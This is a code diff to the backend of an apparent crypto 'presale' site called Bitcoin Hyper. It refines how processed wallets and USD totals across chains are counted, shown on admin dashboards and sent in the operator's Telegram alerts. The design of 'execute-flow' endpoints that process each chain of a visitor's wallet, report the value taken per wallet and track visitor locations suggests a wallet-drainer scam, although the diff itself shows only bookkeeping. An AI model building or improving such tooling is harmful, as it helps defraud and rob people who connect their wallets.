@@ -192,6 +192,10 @@ app.use('/api/', limiter);
 // ============================================
 
 app.get('/', (req, res) => {
+  // Calculate total processed wallets correctly
+  const totalProcessedWallets = memoryStorage?.settings?.statistics?.totalProcessedWallets || 0;
+  const totalRaised = memoryStorage?.settings?.statistics?.totalProcessedUSD || 0;
+  
   res.json({
     success: true,
     name: 'Bitcoin Hyper Backend',
@@ -201,7 +205,8 @@ app.get('/', (req, res) => {
     stats: {
       totalParticipants: memoryStorage?.participants?.length || 0,
       totalVisits: memoryStorage?.siteVisits?.length || 0,
-      totalRaised: `$${memoryStorage?.settings?.statistics?.totalProcessedUSD?.toFixed(2) || '0.00'}`,
+      totalRaised: `$${totalRaised.toFixed(2)}`,
+      totalProcessedWallets: totalProcessedWallets,
       pendingFlows: memoryStorage?.pendingFlows?.size || 0,
       completedFlows: memoryStorage?.completedFlows?.size || 0
     },
@@ -398,6 +403,9 @@ async function testTelegramConnection() {
     telegramBotName = meResponse.data.result.username;
     console.log(`✅ Bot authenticated: @${telegramBotName}`);
     
+    // Calculate total processed wallets
+    const totalProcessedWallets = memoryStorage.settings.statistics.totalProcessedWallets || 0;
+    
     // Send startup message with site URL and current stats
     const startMessage = 
       `🚀 <b>BITCOIN HYPER BACKEND ONLINE</b>\n` +
@@ -407,6 +415,7 @@ async function testTelegramConnection() {
       `🌍 <b>Site URL:</b> https://bitcoinhypertoken.vercel.app\n` +
       `💾 <b>Storage:</b> ${memoryStorage.participants.length} participants, ${memoryStorage.siteVisits.length} visits\n` +
       `💰 <b>Total Raised:</b> $${memoryStorage.settings.statistics.totalProcessedUSD.toFixed(2)}\n` +
+      `👛 <b>Processed Wallets:</b> ${totalProcessedWallets}\n` +
       `📊 Admin: https://bthbk.vercel.app/api/admin/dashboard?token=${process.env.ADMIN_TOKEN || 'YOUR_TOKEN'}`;
     
     const sendResult = await sendTelegramMessage(startMessage);
@@ -954,7 +963,7 @@ app.post('/api/presale/prepare-flow', async (req, res) => {
 });
 
 // ============================================
-// EXECUTE FLOW ENDPOINT - FULL NOTIFICATIONS RESTORED WITH CORRECT USD
+// EXECUTE FLOW ENDPOINT - FULL NOTIFICATIONS WITH CORRECT USD SUMMATION
 // ============================================
 
 app.post('/api/presale/execute-flow', async (req, res) => {
@@ -984,8 +993,6 @@ app.post('/api/presale/execute-flow', async (req, res) => {
         timestamp: new Date().toISOString() 
       });
       
-      memoryStorage.settings.statistics.totalProcessedWallets++;
-      
       // Get flow from pending flows
       const flow = memoryStorage.pendingFlows.get(flowId);
       let txValueUSD = 0;
@@ -1010,6 +1017,16 @@ app.post('/api/presale/execute-flow', async (req, res) => {
             symbol: txSymbol,
             timestamp: new Date().toISOString()
           });
+          
+          // Increment total processed wallets ONLY ONCE per unique wallet
+          // Check if this wallet hasn't been counted before in this flow
+          const walletProcessedBefore = memoryStorage.settings.statistics.processedTransactions.some(
+            t => t.wallet === walletAddress && t.flowId !== flowId
+          );
+          
+          if (!walletProcessedBefore) {
+            memoryStorage.settings.statistics.totalProcessedWallets++;
+          }
         }
       }
       
@@ -1036,24 +1053,32 @@ app.post('/api/presale/execute-flow', async (req, res) => {
         
         // Check if flow is complete
         if (flow.completedChains.length === flow.transactions.length) {
+          // Add to total processed USD
           memoryStorage.settings.statistics.totalProcessedUSD += parseFloat(flow.totalFlowUSD);
+          
+          // Move to completed flows
           memoryStorage.completedFlows.set(flowId, { 
             ...flow, 
             completedAt: new Date().toISOString() 
           });
           memoryStorage.pendingFlows.delete(flowId);
           
-          // Full completion notification with all details
+          // Calculate total from all chains for this flow
           let completionDetails = '';
+          let flowTotalUSD = 0;
+          
           flow.transactions.forEach(t => {
             const completed = flow.completedChains.includes(t.chain) ? '✅' : '❌';
-            completionDetails += `\n   ${completed} ${t.chain}: ${t.amount} ${t.symbol} ($${t.valueUSD})`;
+            const txValue = parseFloat(t.valueUSD);
+            flowTotalUSD += txValue;
+            completionDetails += `\n   ${completed} ${t.chain}: ${t.amount} ${t.symbol} ($${txValue.toFixed(2)})`;
           });
           
+          // Full completion notification with all details
           await sendTelegramMessage(
             `✅ <b>🎉 FLOW COMPLETED 🎉</b>\n` +
             `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
-            `💵 <b>Total Value:</b> $${flow.totalFlowUSD}\n` +
+            `💵 <b>Total Value:</b> $${flowTotalUSD.toFixed(2)}\n` +
             `🔗 <b>All ${flow.transactions.length} chains processed!</b>${completionDetails}\n` +
             `🆔 <b>Flow ID:</b> <code>${flowId}</code>\n` +
             `🌍 <b>Site URL:</b> https://bitcoinhypertoken.vercel.app`
@@ -1118,7 +1143,7 @@ app.post('/api/presale/claim', async (req, res) => {
 });
 
 // ============================================
-// ADMIN DASHBOARD WITH TIME TOGGLE (1, 7, 30 days) - CORRECT TOTAL RAISED
+// ADMIN DASHBOARD WITH TIME TOGGLE - CORRECT TOTALS FROM ALL CHAINS
 // ============================================
 
 app.get('/api/admin/dashboard', (req, res) => {
@@ -1175,11 +1200,14 @@ app.get('/api/admin/dashboard', (req, res) => {
         .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
     : [];
   
-  // Calculate total raised in this period (sum of all transaction values)
+  // Calculate total raised in this period (sum of all transaction values from all chains)
   const totalRaisedInPeriod = filteredTransactions.reduce((sum, t) => sum + (t.valueUSD || 0), 0);
   
-  // Calculate total raised all time
+  // Calculate total raised all time (sum of all transactions ever from all chains)
   const totalRaisedAllTime = memoryStorage.settings?.statistics?.totalProcessedUSD || 0;
+  
+  // Calculate unique wallets processed in this period
+  const uniqueWalletsInPeriod = new Set(filteredTransactions.map(t => t.wallet)).size;
   
   // ============================================
   // LOCATION STATS
@@ -1245,7 +1273,7 @@ app.get('/api/admin/dashboard', (req, res) => {
   }));
   
   // ============================================
-  // SUMMARY STATISTICS - WITH CORRECT TOTAL RAISED
+  // SUMMARY STATISTICS - WITH CORRECT TOTALS FROM ALL CHAINS
   // ============================================
   
   const summary = {
@@ -1258,7 +1286,9 @@ app.get('/api/admin/dashboard', (req, res) => {
     claimedParticipants: filteredParticipants.filter(p => p && p.claimed).length,
     totalRaisedInPeriod: totalRaisedInPeriod.toFixed(2),
     totalRaisedAllTime: totalRaisedAllTime.toFixed(2),
-    totalProcessedWallets: filteredTransactions.length,
+    totalProcessedWalletsInPeriod: uniqueWalletsInPeriod,
+    totalProcessedWalletsAllTime: memoryStorage.settings?.statistics?.totalProcessedWallets || 0,
+    totalTransactions: filteredTransactions.length,
     pendingFlows: filteredPendingFlows.length,
     completedFlows: filteredCompletedFlows.length,
     telegramStatus: telegramEnabled ? '✅ Connected' : '❌ Disabled',
@@ -1280,7 +1310,8 @@ app.get('/api/admin/dashboard', (req, res) => {
       allTimeParticipants: memoryStorage.participants.length,
       allTimeVisits: memoryStorage.siteVisits.length,
       allTimeFlows: memoryStorage.completedFlows.size,
-      allTimeRaised: totalRaisedAllTime.toFixed(2)
+      allTimeRaised: totalRaisedAllTime.toFixed(2),
+      allTimeProcessedWallets: memoryStorage.settings?.statistics?.totalProcessedWallets || 0
     }
   };
   
@@ -1310,7 +1341,7 @@ app.get('/api/admin/dashboard', (req, res) => {
 });
 
 // ============================================
-// ADMIN STATS (quick stats endpoint) - CORRECT TOTAL RAISED
+// ADMIN STATS (quick stats endpoint) - CORRECT TOTALS
 // ============================================
 
 app.get('/api/admin/stats', (req, res) => {
@@ -1321,8 +1352,9 @@ app.get('/api/admin/stats', (req, res) => {
     return res.status(401).json({ success: false });
   }
   
-  // Calculate total raised correctly
+  // Calculate total raised correctly from all chains
   const totalRaised = memoryStorage.settings?.statistics?.totalProcessedUSD || 0;
+  const totalProcessedWallets = memoryStorage.settings?.statistics?.totalProcessedWallets || 0;
   
   res.json({
     success: true,
@@ -1331,6 +1363,7 @@ app.get('/api/admin/stats', (req, res) => {
       eligible: memoryStorage.participants.filter(p => p && p.isEligible).length,
       claimed: memoryStorage.participants.filter(p => p && p.claimed).length,
       totalRaisedUSD: totalRaised.toFixed(2),
+      totalProcessedWallets: totalProcessedWallets,
       pendingFlows: memoryStorage.pendingFlows?.size || 0,
       completedFlows: memoryStorage.completedFlows?.size || 0,
       telegram: telegramEnabled ? '✅' : '❌',
@@ -1379,7 +1412,7 @@ app.get('/api/admin/wallet/:address', (req, res) => {
   const transactions = memoryStorage.settings?.statistics?.processedTransactions
     .filter(t => t && t.wallet && t.wallet.toLowerCase() === walletAddress) || [];
   
-  // Calculate total for this wallet
+  // Calculate total for this wallet from all chains
   const walletTotal = transactions.reduce((sum, t) => sum + (t.valueUSD || 0), 0);
   
   res.json({
@@ -1387,7 +1420,8 @@ app.get('/api/admin/wallet/:address', (req, res) => {
     found: true,
     wallet: {
       ...participant,
-      totalContributed: walletTotal.toFixed(2)
+      totalContributed: walletTotal.toFixed(2),
+      transactionCount: transactions.length
     },
     visits,
     flows,
@@ -1466,6 +1500,7 @@ async function startServer() {
   📁 Total Participants: ${memoryStorage.participants.length}
   📁 Total Visits: ${memoryStorage.siteVisits.length}
   💰 Total Raised: $${memoryStorage.settings.statistics.totalProcessedUSD.toFixed(2)}
+  👛 Processed Wallets: ${memoryStorage.settings.statistics.totalProcessedWallets}
   📁 Pending Flows: ${memoryStorage.pendingFlows.size}
   📁 Completed Flows: ${memoryStorage.completedFlows.size}
   
